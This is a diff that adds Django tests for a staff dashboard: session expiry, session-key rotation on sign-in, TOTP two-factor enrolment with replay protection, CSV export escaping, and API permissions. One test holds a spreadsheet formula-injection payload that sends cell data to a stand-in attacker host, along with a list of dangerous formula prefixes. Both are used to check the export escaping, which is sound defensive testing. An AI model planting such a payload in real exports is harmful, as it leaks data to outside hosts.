@@ -2,6 +2,7 @@ import csv
 import io
 import json
 import tempfile
+import time
 from datetime import timedelta
 from decimal import Decimal
 
@@ -12,6 +13,7 @@ from django.forms.models import model_to_dict
 from django.test import Client, TestCase, override_settings
 from django.urls import reverse
 from django.utils import timezone
+from django_otp.plugins.otp_totp.models import TOTPDevice
 from freezegun import freeze_time
 
 from apps.blog.models import BlogCategory
@@ -20,6 +22,7 @@ from apps.commerce.models import Order
 from apps.core.models import AuditLog, NewsletterSubscriber, SiteSettings
 from apps.core.testing import PASSWORD, docx_bytes, image_upload, make_application, make_job, make_staff, make_user, release_file_response
 from apps.dashboard.crud import REGISTRY
+from apps.dashboard.mixins import SESSION_STARTED_KEY
 from apps.estimator.models import EstimatorConfig, ProjectInquiry
 from apps.portfolio.models import TeamMember
 from apps.services.models import Technology
@@ -488,3 +491,211 @@ class TeamPhotoUploadTests(DashboardTestCase):
         self.client.post(self.CREATE, self.form_data(is_leadership="on", photo=image_upload()))
         member = TeamMember.objects.get()
         self.assertContains(Client().get(reverse("core:about")), member.photo.url)
+
+
+def totp_token(device):
+    """The code the applicant's authenticator app would be showing right now."""
+    from django_otp.oath import TOTP
+
+    totp = TOTP(device.bin_key, device.step, device.t0, device.digits)
+    totp.time = time.time()
+    return totp.token()
+
+
+class StaffSessionTests(DashboardTestCase):
+    """A staff session does not last forever, and cannot be fixed before sign-in."""
+
+    def test_the_session_key_is_replaced_on_sign_in(self):
+        client = Client()
+        client.get(DASH_LOGIN)  # hands out a session before anyone has signed in
+        before = client.session.session_key
+        client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+        self.assertIsNotNone(before)
+        self.assertNotEqual(client.session.session_key, before)
+
+    def test_sign_in_stamps_the_start_of_the_session(self):
+        client = Client()
+        client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+        self.assertAlmostEqual(client.session[SESSION_STARTED_KEY], timezone.now().timestamp(), delta=30)
+
+    def test_a_session_older_than_the_limit_is_signed_out(self):
+        overview = reverse("dashboard:overview")
+        self.assertEqual(self.client.get(overview).status_code, 200)
+        session = self.client.session
+        session[SESSION_STARTED_KEY] = (timezone.now() - timedelta(hours=9)).timestamp()
+        session.save()
+        response = self.client.get(overview)
+        self.assertEqual(response.status_code, 302)
+        self.assertIn(DASH_LOGIN, response["Location"])
+        self.assertNotIn("_auth_user_id", self.client.session)
+
+    @override_settings(STAFF_SESSION_HOURS=1)
+    def test_the_limit_is_configurable(self):
+        session = self.client.session
+        session[SESSION_STARTED_KEY] = (timezone.now() - timedelta(minutes=90)).timestamp()
+        session.save()
+        self.assertEqual(self.client.get(reverse("dashboard:overview")).status_code, 302)
+
+    def test_a_fresh_session_is_left_alone(self):
+        session = self.client.session
+        session[SESSION_STARTED_KEY] = (timezone.now() - timedelta(hours=7)).timestamp()
+        session.save()
+        self.assertEqual(self.client.get(reverse("dashboard:overview")).status_code, 200)
+
+
+class TwoFactorTests(DashboardTestCase):
+    SECURITY = reverse("dashboard:security")
+    VERIFY = reverse("dashboard:two_factor")
+    OVERVIEW = reverse("dashboard:overview")
+
+    def setUp(self):
+        super().setUp()
+        cache.clear()
+
+    def enrol(self):
+        """Walks the staff user through setup the way the page does."""
+        self.client.get(self.SECURITY)
+        device = TOTPDevice.objects.get(user=self.staff, confirmed=False)
+        self.client.post(self.SECURITY, {"token": totp_token(device)})
+        device.refresh_from_db()
+        return device
+
+    def test_it_is_off_by_default_so_nobody_is_locked_out_by_a_deploy(self):
+        self.assertFalse(settings.STAFF_2FA_REQUIRED)
+        self.assertEqual(self.client.get(self.OVERVIEW).status_code, 200)
+
+    def test_a_staff_member_can_enrol_before_it_is_switched_on(self):
+        page = self.client.get(self.SECURITY)
+        self.assertContains(page, "data:image/svg+xml;base64,")  # the QR code, served inline
+        self.assertContains(page, "Setup key")
+        device = self.enrol()
+        self.assertTrue(device.confirmed)
+        self.assertTrue(audit("enabled two-factor authentication").exists())
+        self.assertContains(self.client.get(self.SECURITY), "Two-step verification is on")
+
+    def test_a_wrong_code_does_not_confirm_the_device(self):
+        self.client.get(self.SECURITY)
+        response = self.client.post(self.SECURITY, {"token": "000000"})
+        self.assertContains(response, "That code is not right")
+        self.assertFalse(TOTPDevice.objects.filter(user=self.staff, confirmed=True).exists())
+
+    @override_settings(STAFF_2FA_REQUIRED=True)
+    def test_when_required_the_dashboard_asks_for_a_code_before_anything_else(self):
+        with freeze_time(timezone.now()) as clock:
+            device = self.enrol()
+            self.client.logout()
+            self.client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+            self.assertRedirects(self.client.get(self.OVERVIEW), self.VERIFY)
+            self.assertContains(self.client.get(self.VERIFY), "Two-step verification")
+
+            clock.tick(delta=timedelta(seconds=60))  # the app has moved on to the next code
+            self.assertRedirects(self.client.post(self.VERIFY, {"token": totp_token(device)}), self.OVERVIEW)
+            self.assertEqual(self.client.get(self.OVERVIEW).status_code, 200)
+
+    @override_settings(STAFF_2FA_REQUIRED=True)
+    def test_a_code_cannot_be_used_twice(self):
+        """Replay protection: a code shoulder-surfed or captured in transit is already spent."""
+        with freeze_time(timezone.now()) as clock:
+            device = self.enrol()
+            self.client.logout()
+            self.client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+            clock.tick(delta=timedelta(seconds=60))
+            token = totp_token(device)
+            self.assertRedirects(self.client.post(self.VERIFY, {"token": token}), self.OVERVIEW)
+            self.client.logout()
+            self.client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+            self.assertContains(self.client.post(self.VERIFY, {"token": token}), "That code is not right")
+
+    @override_settings(STAFF_2FA_REQUIRED=True)
+    def test_a_wrong_code_leaves_the_dashboard_closed(self):
+        self.enrol()
+        self.client.logout()
+        self.client.post(DASH_LOGIN, {"username": self.staff.get_username(), "password": PASSWORD})
+        self.assertContains(self.client.post(self.VERIFY, {"token": "123456"}), "That code is not right")
+        self.assertRedirects(self.client.get(self.OVERVIEW), self.VERIFY)
+
+    @override_settings(STAFF_2FA_REQUIRED=True)
+    def test_someone_who_never_enrolled_is_sent_to_set_it_up(self):
+        self.assertRedirects(self.client.get(self.OVERVIEW), self.VERIFY, fetch_redirect_response=False)
+        self.assertRedirects(self.client.get(self.VERIFY), self.SECURITY)
+        self.assertContains(self.client.get(self.SECURITY), "required for staff accounts")
+
+    @override_settings(STAFF_2FA_REQUIRED=True)
+    def test_it_cannot_be_turned_off_while_it_is_required(self):
+        device = self.enrol()
+        self.client.post(reverse("dashboard:two_factor_disable"))
+        self.assertTrue(TOTPDevice.objects.filter(pk=device.pk).exists())
+
+    def test_it_can_be_turned_off_again_while_it_is_optional(self):
+        self.enrol()
+        self.client.post(reverse("dashboard:two_factor_disable"))
+        self.assertFalse(TOTPDevice.objects.filter(user=self.staff).exists())
+        self.assertTrue(audit("disabled two-factor authentication").exists())
+
+    def test_the_pages_are_closed_to_everyone_but_staff(self):
+        self.client.logout()
+        for url in [self.SECURITY, self.VERIFY]:
+            self.assertEqual(self.client.get(url).status_code, 302)
+        self.client.force_login(make_user())  # signed in, but not staff
+        for url in [self.SECURITY, self.VERIFY]:
+            self.assertEqual(self.client.get(url).status_code, 404)
+
+
+class CsvExportSafetyTests(DashboardTestCase):
+    """Applicant-supplied text lands in a spreadsheet, so it must not land there as a formula."""
+
+    PAYLOAD = '=HYPERLINK("https://evil.example?x="&A1,"Click")'
+
+    def test_a_formula_in_an_applicant_field_is_exported_as_text(self):
+        job = make_job()
+        make_application(job, full_name=self.PAYLOAD, email="x@example.com", current_location="+1-555")
+        body = self.client.get(reverse("dashboard:applications_export")).content.decode()
+        row = next(line for line in body.splitlines() if "x@example.com" in line)
+        self.assertIn(",\"'=HYPERLINK", row)  # quoted by csv, and defused with a leading apostrophe
+        self.assertNotIn(",=HYPERLINK", row)
+        self.assertIn(",'+1-555,", row)
+
+    def test_the_newsletter_export_is_protected_the_same_way(self):
+        NewsletterSubscriber.objects.create(email="ok@example.com")
+        body = self.client.get(reverse("dashboard:newsletter_export")).content.decode()
+        self.assertIn("ok@example.com", body)
+
+    def test_every_dangerous_prefix_is_covered(self):
+        from apps.dashboard.views import csv_cell
+
+        for prefix in ["=", "+", "-", "@", "\t", "\r"]:
+            self.assertTrue(csv_cell(f"{prefix}cmd").startswith("'"), prefix)
+        for safe in ["Asmita Gurung", "9800000000", "", None, "a=b"]:
+            self.assertFalse(str(csv_cell(safe)).startswith("'"), safe)
+
+
+class ApiPermissionTests(DashboardTestCase):
+    def url(self, lead):
+        return reverse("dashboard:api_lead_status", args=[lead.pk])
+
+    def make_lead(self):
+        return ProjectInquiry.objects.create(
+            reference="PI-API", project_type_label="Web", timeline="standard", team_preference="unsure",
+            design_needs="existing", name="Lead", email="lead@example.com", estimate_low_npr=1, estimate_high_npr=2,
+            estimate_weeks_low=1, estimate_weeks_high=2, exchange_rate=Decimal("134"),
+        )
+
+    def test_staff_can_move_a_card(self):
+        lead = self.make_lead()
+        response = self.client.patch(self.url(lead), json.dumps({"status": "qualified"}), content_type="application/json")
+        self.assertEqual(response.status_code, 200)
+
+    def test_a_deactivated_account_loses_the_api_even_with_a_live_session(self):
+        lead = self.make_lead()
+        self.staff.is_active = False
+        self.staff.save(update_fields=["is_active"])
+        response = self.client.patch(self.url(lead), json.dumps({"status": "won"}), content_type="application/json")
+        self.assertEqual(response.status_code, 403)
+        lead.refresh_from_db()
+        self.assertEqual(lead.status, "new")
+
+    def test_a_signed_out_visitor_gets_nothing(self):
+        lead = self.make_lead()
+        self.client.logout()
+        response = Client().patch(self.url(lead), json.dumps({"status": "won"}), content_type="application/json")
+        self.assertIn(response.status_code, (401, 403))
